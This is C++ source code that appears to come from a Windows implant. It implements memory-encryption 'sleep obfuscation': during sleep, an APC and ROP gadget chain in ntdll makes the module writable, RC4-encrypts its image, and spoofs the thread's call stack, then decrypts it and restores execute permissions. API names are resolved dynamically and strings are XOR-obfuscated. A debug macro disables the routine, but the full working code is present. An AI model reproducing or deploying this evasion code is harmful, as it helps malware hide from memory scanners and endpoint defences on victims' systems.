#include "sleep_obfuscation.hpp"


void generate_random(config_t *config, uint8_t *buffer, size_t size) {
  LARGE_INTEGER perf, time;
  uint32_t tid = 0;
  
  fnQueryPerformanceCounter fn_query_performance_counter = (fnQueryPerformanceCounter) get_proc_address(config->kernel32, QUERYPERFORMANCECOUNTER);
  fnGetSystemTimeAsFileTime fn_get_system_time_as_file_time = (fnGetSystemTimeAsFileTime) get_proc_address(config->kernel32, GETSYSTEMTIMEASFILETIME);
  fnGetCurrentThreadId fn_get_current_thread_id = (fnGetCurrentThreadId) get_proc_address(config->kernel32, GETCURRENTTHREADID);
  fnSleep fn_sleep = (fnSleep) get_proc_address(config->kernel32, SLEEP);

  tid = fn_get_current_thread_id();

  for(size_t i = 0; i < size; i++) {
    fn_query_performance_counter(&perf);
    fn_get_system_time_as_file_time((FILETIME *)&time);
    buffer[i] = (uint8_t) (perf.LowPart ^ perf.HighPart ^ time.LowPart ^ time.HighPart ^ tid ^ (uint64_t)&buffer[i]);
    fn_sleep(1); //WARN Could remove for
  }
};

uint64_t *get_gadget(void *module_addr, uint8_t *pattern, size_t pattern_size, uint32_t is_direct) {
  size_t offset = 0;
  for(size_t i = 0; i < (MODULE_SIZE(module_addr) - pattern_size); i++) {
    if(!_memcmp((void *)((uint64_t)module_addr + i), pattern, pattern_size)) {
      if(!is_direct) {
        offset = pattern_size;
      }
      return (uint64_t *)((uint64_t)module_addr + offset + i);
    }
  } 
  return NULL;
}

// Temporary: Disable complex sleep obfuscation for testing
// Set to 0 to re-enable full sleep obfuscation
#define DISABLE_SLEEP_OBFUSCATION 1

void sleep_obfuscation(config_t *config, HANDLE wait_handle){
#if DISABLE_SLEEP_OBFUSCATION
  // Simplified version: Just wait on the handle without memory encryption
  DEBUG("Sleep obfuscation: Using simplified wait (no memory encryption)");

  typedef DWORD (WINAPI* fnWaitForSingleObject)(HANDLE, DWORD);
  fnWaitForSingleObject fn_wait = (fnWaitForSingleObject)get_proc_address(config->kernel32, WAITFORSINGLEOBJECT);

  if (!fn_wait) {
    ERROR_LOG("Failed to resolve WaitForSingleObject");
    return;
  }

  DEBUG("Waiting for connection event...");
  fn_wait(wait_handle, INFINITE);
  DEBUG("Event signaled, connection established!");
  return;
#else
  // Original complex sleep obfuscation code below
  CONTEXT ctx = {};
  CONTEXT ctx_sync = {};
  CONTEXT ctx_rw = {};
  CONTEXT ctx_enc = {};
  CONTEXT ctx_delay = {};
  CONTEXT ctx_backup = {};
  CONTEXT ctx_spoof = {};
  CONTEXT ctx_dec = {};
  CONTEXT ctx_rwx = {};
  CONTEXT ctx_restore = {};
  CONTEXT ctx_event = {};
  CONTEXT ctx_end = {};
  CONTEXT ctx_og = {};
  CONTEXT ctx_fake = {};
  uint8_t nt_test_alert_pattern[] = { 0x48, 0x83, 0xEC, 0x28, 0xF7, 0x41, 0x04, 0x66, 0x00, 0x00, 0x00, 0x74, 0x05 };
  uint8_t jmp_rdi_pattern[] = { 0xFF, 0xE7 };
  uint8_t key[KEY_SIZE] = {};
  ustring_t ukey = {};
  ustring_t udata = {};
  uint32_t thread_id = 0;
  char str_cryptsp_dll[sizeof(XOR_CRYPTSP)] = {0};
  HANDLE sleep_obf_heap = NULL, current_thread = NULL, thread = NULL;
  uint64_t *module_addr = NULL;
  uint64_t module_size = 0;
  HANDLE event_end = NULL;
  HANDLE event_sync = NULL;
  uint64_t *ret_gadget = NULL;
  uint64_t *jmp_gadget = NULL;

  uint64_t *fake_stack_rw = NULL;
  uint64_t *fake_stack_rwx = NULL;
  uint64_t *fake_stack_spoof = NULL;


  ctx_og.ContextFlags = CONTEXT_FULL;
  ctx_fake.ContextFlags = CONTEXT_FULL;
  ctx.ContextFlags = CONTEXT_ALL;

  fnCreateEventA fn_create_event_a = (fnCreateEventA) get_proc_address(config->kernel32, CREATEEVENTA);
  fnQueueUserAPC fn_queue_user_apc = (fnQueueUserAPC) get_proc_address(config->kernel32, QUEUEUSERAPC);
  fnOpenThread fn_open_thread = (fnOpenThread) get_proc_address(config->kernel32, OPENTHREAD);
  fnGetCurrentThreadId fn_get_current_thread_id = (fnGetCurrentThreadId) get_proc_address(config->kernel32, GETCURRENTTHREADID);
  fnCreateThread fn_create_thread = (fnCreateThread) get_proc_address(config->kernel32, CREATETHREAD);
  fnGetThreadContext fn_get_thread_context = (fnGetThreadContext) get_proc_address(config->kernel32, GETTHREADCONTEXT);
  fnCloseHandle fn_close_handle = (fnCloseHandle) get_proc_address(config->kernel32, CLOSEHANDLE);
  fnNtAlertResumeThread fn_nt_alert_resume_thread = (fnNtAlertResumeThread) get_proc_address(config->ntdll, NTALERTRESUMETHREAD);
  fnNtSignalAndWaitForSingleObject fn_nt_signal_and_wait_for_single_object = (fnNtSignalAndWaitForSingleObject) get_proc_address(config->ntdll, NTSIGNALANDWAITFORSINGLEOBJECT);
  fnGetModuleHandleA fn_get_module_handle_a = (fnGetModuleHandleA) get_proc_address(config->kernel32, GETMODULEHANDLEA);
  fnLoadLibraryA fn_load_library_a = (fnLoadLibraryA)get_proc_address(config->kernel32, LOADLIBRARYA);
  fnFreeLibrary fn_free_library = (fnFreeLibrary) get_proc_address(config->kernel32, FREELIBRARY);
  fnHeapAlloc fn_rtl_allocate_heap = (fnHeapAlloc) get_proc_address(config->ntdll, RTLALLOCATEHEAP);
  fnHeapCreate fn_heap_create = (fnHeapCreate) get_proc_address(config->kernel32, HEAPCREATE);
  fnHeapDestroy fn_heap_destroy = (fnHeapDestroy) get_proc_address(config->kernel32, HEAPDESTROY);
  uint64_t fn_wait_for_single_object = get_proc_address(config->kernel32, WAITFORSINGLEOBJECT);
  uint64_t fn_nt_continue_gadget = get_proc_address(config->ntdll, LDRINITIALIZETHUNK) + 19;
  uint64_t fn_nt_test_alert = get_proc_address(config->ntdll, NTTESTALERT);
  uint64_t fn_rtl_exit_user_thread = get_proc_address(config->ntdll, RTLEXITUSERTHREAD);
  uint64_t fn_tp_release_cleanup_group_members = get_proc_address(config->ntdll, TPRELEASECLEANUPGROUPMEMBERS) + 0x450;
  uint64_t fn_rtl_user_thread_start = get_proc_address(config->ntdll, RTLUSERTHREADSTART);
  uint64_t fn_nt_set_context_thread = get_proc_address(config->ntdll, NTSETCONTEXTTHREAD);
  uint64_t fn_nt_get_context_thread = get_proc_address(config->ntdll, NTGETCONTEXTTHREAD);
  uint64_t fn_virtual_protect = get_proc_address(config->kernel32 , VIRTUALPROTECT);
  uint64_t fn_set_event = get_proc_address(config->kernel32, SETEVENT);

  xor_decrypt(str_cryptsp_dll, XOR_CRYPTSP, sizeof(XOR_CRYPTSP) - 1);
  HMODULE cryptsp_dll = fn_load_library_a(str_cryptsp_dll);
  
  uint64_t fn_rc4_encrypt_decrypt = (uint64_t)get_proc_address(cryptsp_dll, SYSTEMFUNCTION033);

  if(!fn_create_event_a || !fn_queue_user_apc || !fn_open_thread || !fn_get_current_thread_id || !fn_create_thread || !fn_get_thread_context || !fn_close_handle || !fn_nt_alert_resume_thread || !fn_nt_signal_and_wait_for_single_object || !fn_get_module_handle_a || !fn_wait_for_single_object || !fn_nt_continue_gadget || !fn_nt_test_alert || !fn_rtl_exit_user_thread || !fn_rc4_encrypt_decrypt || !fn_tp_release_cleanup_group_members || !fn_rtl_user_thread_start || !fn_nt_set_context_thread || !fn_virtual_protect || !fn_set_event) {
    DEBUG("One function wasn't found");
    return;
  }

  DEBUG("Getting module handle and size...");
  module_addr = (uint64_t*)fn_get_module_handle_a(NULL);
  if(!module_addr) {
    ERROR_LOG("Failed to get module handle");
    goto failed;
  }
  DEBUG("Module address: %p", module_addr);

  module_size = MODULE_SIZE(module_addr);
  DEBUG("Module size: %llu", module_size);
  
  DEBUG("Creating events...");
  event_end = fn_create_event_a(0, 0, 0, 0);
  event_sync = fn_create_event_a(0, 0, 0, 0);

  if(!event_end || !event_sync) {
    ERROR_LOG("Failed to create event");
    goto failed;
  }
  DEBUG("Events created successfully");

  DEBUG("Searching for gadgets in ntdll...");
  ret_gadget = get_gadget(config->ntdll, nt_test_alert_pattern, sizeof(nt_test_alert_pattern), 0);
  jmp_gadget = get_gadget(config->ntdll, jmp_rdi_pattern, sizeof(jmp_rdi_pattern), 1);

  if(!ret_gadget || !jmp_gadget) {
    ERROR_LOG("One of the gadget wasn't found");
    goto failed;
  }
  DEBUG("Gadgets found: ret=%p, jmp=%p", ret_gadget, jmp_gadget);

  DEBUG("Generating random key...");
  generate_random(config, key, KEY_SIZE);

  ukey.buffer = &key;
  ukey.length = ukey.maximum_length = KEY_SIZE;

  udata.buffer = module_addr;
  udata.length = udata.maximum_length = module_size;

  DEBUG("Creating heap for sleep obfuscation...");
  sleep_obf_heap = fn_heap_create(HEAP_NO_SERIALIZE, 0, 0);
  if (!sleep_obf_heap) {
    ERROR_LOG("Failed to create heap for sleep obf");
    goto failed;
  }
  DEBUG("Heap created: %p", sleep_obf_heap);

  DEBUG("Allocating fake stacks...");
  fake_stack_rw = (uint64_t*)fn_rtl_allocate_heap(sleep_obf_heap, HEAP_ZERO_MEMORY, 0x5000);
  fake_stack_rwx = (uint64_t*)fn_rtl_allocate_heap(sleep_obf_heap, HEAP_ZERO_MEMORY, 0x5000);
  fake_stack_spoof = (uint64_t*)fn_rtl_allocate_heap(sleep_obf_heap, HEAP_ZERO_MEMORY, 0x5000);

  if(!fake_stack_rw || !fake_stack_rwx || !fake_stack_spoof) {
    ERROR_LOG("Failed to alloc memory for fake stack (rw=%p, rwx=%p, spoof=%p)",
              fake_stack_rw, fake_stack_rwx, fake_stack_spoof);
    goto failed;
  }
  DEBUG("Fake stacks allocated successfully");

  // Add offset AFTER null check
  fake_stack_rw += 0x1000;
  fake_stack_rwx += 0x1000;
  DEBUG("Adjusted fake stack pointers: rw=%p, rwx=%p", fake_stack_rw, fake_stack_rwx);

  DEBUG("Writing gadget addresses to fake stacks...");
  *(PULONG_PTR)fake_stack_rw = (uint64_t)ret_gadget;
  *(PULONG_PTR)fake_stack_rwx = (uint64_t)ret_gadget;
  DEBUG("Gadget addresses written successfully");

  DEBUG("Setting up fake context...");
  ctx_fake.Rip = fn_rtl_user_thread_start;
  ctx_fake.Rsp = (uint64_t)fake_stack_spoof;

  DEBUG("Opening current thread...");
  current_thread = fn_open_thread(THREAD_ALL_ACCESS, TRUE, fn_get_current_thread_id());
  if(!current_thread) {
    ERROR_LOG("OpenThread failed");
    goto failed;
  }
  DEBUG("Current thread opened: %p", current_thread);

  DEBUG("Creating suspended thread...");
  thread = fn_create_thread(NULL, 65535,  (unsigned long(*)(void*))fn_tp_release_cleanup_group_members, NULL, CREATE_SUSPENDED, &thread_id);
  if(thread) {
    DEBUG("Thread created: %p (TID: %u)", thread, thread_id);
    uint32_t old_protect = 0;

    DEBUG("Getting thread context...");
    if(!fn_get_thread_context(thread, &ctx)) {
      ERROR_LOG("Failed to get thread context");
      goto failed;
    }
    DEBUG("Thread context retrieved successfully");

    DEBUG("Copying context to multiple structures...");
    _memcpy_s(&ctx_sync, sizeof(CONTEXT), &ctx, sizeof(CONTEXT));
    _memcpy_s(&ctx_rw, sizeof(CONTEXT), &ctx, sizeof(CONTEXT));
    _memcpy_s(&ctx_rwx, sizeof(CONTEXT), &ctx, sizeof(CONTEXT));
    _memcpy_s(&ctx_enc, sizeof(CONTEXT), &ctx, sizeof(CONTEXT));
    _memcpy_s(&ctx_backup, sizeof(CONTEXT), &ctx, sizeof(CONTEXT));
    _memcpy_s(&ctx_spoof, sizeof(CONTEXT), &ctx, sizeof(CONTEXT));
    _memcpy_s(&ctx_delay, sizeof(CONTEXT), &ctx, sizeof(CONTEXT));
    _memcpy_s(&ctx_dec, sizeof(CONTEXT), &ctx, sizeof(CONTEXT));
    _memcpy_s(&ctx_restore, sizeof(CONTEXT), &ctx, sizeof(CONTEXT));
    _memcpy_s(&ctx_event, sizeof(CONTEXT), &ctx, sizeof(CONTEXT));
    _memcpy_s(&ctx_end, sizeof(CONTEXT), &ctx, sizeof(CONTEXT));
    DEBUG("Context structures copied successfully");

    DEBUG("Setting up context manipulation chain...");
    ctx_sync.Rip = (uint64_t)jmp_gadget;
    ctx_sync.Rdi = fn_wait_for_single_object;
    ctx_sync.Rcx = (uint64_t) event_sync;
    ctx_sync.Rdx = INFINITE;
    DEBUG("About to write to ctx_enc.Rsp (value: %p)", (void*)ctx_enc.Rsp);
    *(PULONG_PTR)ctx_enc.Rsp = fn_nt_test_alert;
    DEBUG("Successfully wrote to ctx_enc.Rsp"); 

    ctx_rw.Rip = (uint64_t)jmp_gadget;
    ctx_rw.Rdi = fn_virtual_protect;
    ctx_rw.Rcx = (uint64_t) module_addr;
    ctx_rw.Rdx = module_size;
    ctx_rw.R8 = PAGE_READWRITE;
    ctx_rw.R9 = (uint64_t)&old_protect;
    ctx_rw.Rsp = (uint64_t)fake_stack_rw; 
    
    ctx_enc.Rip = (uint64_t)jmp_gadget;
    ctx_enc.Rdi = fn_rc4_encrypt_decrypt;
    ctx_enc.Rcx = (uint64_t)&udata;
    ctx_enc.Rdx = (uint64_t)&ukey;
    *(PULONG_PTR)ctx_enc.Rsp = fn_nt_test_alert; 

    ctx_backup.Rip = (uint64_t)jmp_gadget;
    ctx_backup.Rdi = fn_nt_get_context_thread;
    ctx_backup.Rcx = (uint64_t)current_thread;
    ctx_backup.Rdx = (uint64_t)&ctx_og;
    *(PULONG_PTR)ctx_backup.Rsp = fn_nt_test_alert; 
    
    ctx_spoof.Rip = (uint64_t)jmp_gadget;
    ctx_spoof.Rdi = fn_nt_set_context_thread;
    ctx_spoof.Rcx = (uint64_t)current_thread;
    ctx_spoof.Rdx = (uint64_t)&ctx_fake;
    *(PULONG_PTR)ctx_spoof.Rsp = fn_nt_test_alert; 
    
    ctx_delay.Rip = (uint64_t)jmp_gadget;
    ctx_delay.Rdi = fn_wait_for_single_object;
    ctx_delay.Rcx = (uint64_t) wait_handle;
    ctx_delay.Rdx = INFINITE;
    *(PULONG_PTR)ctx_delay.Rsp = fn_nt_test_alert; 
    
    ctx_dec.Rip = (uint64_t)jmp_gadget;
    ctx_dec.Rdi = fn_rc4_encrypt_decrypt;
    ctx_dec.Rcx = (uint64_t)&udata;
    ctx_dec.Rdx = (uint64_t)&ukey;
    *(PULONG_PTR)ctx_dec.Rsp = fn_nt_test_alert; 

    ctx_restore.Rip = (uint64_t)jmp_gadget;
    ctx_restore.Rdi = fn_nt_set_context_thread;
    ctx_restore.Rcx = (uint64_t)current_thread;
    ctx_restore.Rdx = (uint64_t)&ctx_og;
    *(PULONG_PTR)ctx_restore.Rsp = fn_nt_test_alert; 

    ctx_rwx.Rip = (uint64_t)jmp_gadget;
    ctx_rwx.Rdi = fn_virtual_protect;
    ctx_rwx.Rcx = (uint64_t) module_addr;
    ctx_rwx.Rdx = module_size;
    ctx_rwx.R8 = PAGE_EXECUTE_READWRITE; //TODO change this we could xor only text region ? because we have a rwx region when the payload is decrypted. 
    ctx_rwx.R9 = (uint64_t)&old_protect;
    ctx_rwx.Rsp = (uint64_t)fake_stack_rwx; 

    ctx_event.Rip = (uint64_t)jmp_gadget;
    ctx_event.Rdi = fn_set_event;
    ctx_event.Rcx = (uint64_t) event_end;
    *(PULONG_PTR)ctx_event.Rsp = fn_nt_test_alert; 

    ctx_end.Rip = (uint64_t)jmp_gadget;
    ctx_end.Rdi = fn_rtl_exit_user_thread;
    ctx_end.Rcx = 0;
    *(PULONG_PTR)ctx_end.Rsp = fn_nt_test_alert;
    DEBUG("All context structures configured successfully");

    DEBUG("Queueing APCs to suspended thread...");
    fn_queue_user_apc((PAPCFUNC)fn_nt_continue_gadget, thread, &ctx_sync);
    fn_queue_user_apc((PAPCFUNC)fn_nt_continue_gadget, thread, &ctx_rw);
    fn_queue_user_apc((PAPCFUNC)fn_nt_continue_gadget, thread, &ctx_enc);
    fn_queue_user_apc((PAPCFUNC)fn_nt_continue_gadget, thread, &ctx_backup);
    fn_queue_user_apc((PAPCFUNC)fn_nt_continue_gadget, thread, &ctx_spoof);
    fn_queue_user_apc((PAPCFUNC)fn_nt_continue_gadget, thread, &ctx_delay);
    fn_queue_user_apc((PAPCFUNC)fn_nt_continue_gadget, thread, &ctx_restore);
    fn_queue_user_apc((PAPCFUNC)fn_nt_continue_gadget, thread, &ctx_rwx);
    fn_queue_user_apc((PAPCFUNC)fn_nt_continue_gadget, thread, &ctx_dec);
    fn_queue_user_apc((PAPCFUNC)fn_nt_continue_gadget, thread, &ctx_event);
    fn_queue_user_apc((PAPCFUNC)fn_nt_continue_gadget, thread, &ctx_end);
    DEBUG("All APCs queued successfully");

    DEBUG("Resuming thread and entering sleep obfuscation...");
    uint32_t abcd = 0;
    fn_nt_alert_resume_thread(thread, &abcd);
    DEBUG("Thread resumed, waiting for completion...");
    fn_nt_signal_and_wait_for_single_object(event_sync, event_end, TRUE, NULL);
    DEBUG("Sleep obfuscation completed successfully");
  }

failed:
  if(current_thread) {
    fn_close_handle(current_thread);
    current_thread = NULL;
  }
  if(thread) {
    fn_close_handle(thread);
    thread = NULL;
  }
  if(event_end) {
    fn_close_handle(event_end);
    event_end = NULL;
  }
  if(event_sync) {
    fn_close_handle(event_sync);
    event_sync = NULL;
  }
  if(sleep_obf_heap) {
    fn_heap_destroy(sleep_obf_heap);
    sleep_obf_heap = NULL;
  }
  if(cryptsp_dll) {
    fn_free_library(cryptsp_dll);
    cryptsp_dll = NULL;
  }

  return;
#endif  // DISABLE_SLEEP_OBFUSCATION
}
